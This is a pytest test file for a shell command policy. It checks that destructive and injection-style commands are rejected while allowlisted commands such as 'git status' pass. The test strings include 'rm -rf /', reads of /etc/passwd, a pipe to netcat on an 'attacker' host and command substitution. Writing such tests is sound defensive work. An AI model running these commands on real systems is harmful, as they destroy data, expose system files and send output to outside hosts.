"""Shell policy tests — command denylist, argv validation, and metachars."""
from __future__ import annotations

import pytest

from aura.core.errors import PolicyError
from aura.core.policy import CommandPolicy, get_policy, split_command_string


def test_denylist_blocks_rm_rf_root():
    policy = get_policy()
    with pytest.raises(PolicyError):
        policy.check_shell_command("rm -rf /")


def test_metacharacters_blocked():
    policy = get_policy()
    for bad in (
        "git status; cat /etc/passwd",
        "git status && echo pwn",
        "echo a | nc attacker 4444",
        "echo `whoami`",
        "echo $(whoami)",
    ):
        with pytest.raises(PolicyError):
            policy.check_shell_command(bad)


def test_redirect_operators_blocked():
    """`>`, `<`, `>>`, `<<` must all be rejected by the shell policy."""
    policy = get_policy()
    for bad in (
        "git status > /tmp/out.txt",
        "git status >> /tmp/out.txt",
        "cat < /etc/passwd",
        "python3 <<EOF",
        "echo hi>/tmp/out",
        "echo hi>>/tmp/out",
    ):
        with pytest.raises(PolicyError):
            policy.check_shell_command(bad)


def test_interpreter_dash_c_blocked():
    policy = get_policy()
    # Even if someone tries to slip through, argv-level validation catches it.
    for bad in (
        "python -c \"import os\"",
        "node -e 1+1",
        "pip install evil",
    ):
        with pytest.raises(PolicyError):
            policy.check_shell_command(bad)


def test_allowlisted_command_passes():
    policy = get_policy()
    policy.check_shell_command("git status")  # no exception
    policy.check_shell_command("npm --version")


def test_argv_splitter_handles_quotes():
    # On Windows shlex uses posix=False and preserves quotes; on POSIX it
    # strips them.  We just want to confirm the tokens are correct.
    tokens = split_command_string('git commit -m "init"')
    assert tokens[:3] == ["git", "commit", "-m"]
    assert tokens[3].strip('"\'') == "init"


def test_kill_target_protects_critical_processes():
    policy = get_policy()
    for name in ("System", "explorer.exe", "systemd", "init"):
        with pytest.raises(PolicyError):
            policy.check_kill_target(name)
